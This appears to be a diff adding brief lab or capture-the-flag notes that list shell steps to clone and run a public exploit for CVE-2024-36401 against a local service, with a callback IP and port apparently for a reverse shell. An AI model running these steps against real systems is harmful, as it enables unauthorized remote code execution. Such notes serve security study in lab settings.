@@ -1,0 +1,10 @@
+## Recon
+- firefox
+## Exploit
+- `git clone https://github.com/Chocapikk/CVE-2024-36401.git`
+- `cd CVE-2024-36401`
+- `python3 -m venv venv`
+- `. venv/bin/activate`
+- `pip install -r requirements.txt`
+- `python exploit.py -u http://localhost:8080 -ip 192.168.31.154 -rp 80`
+- `find`
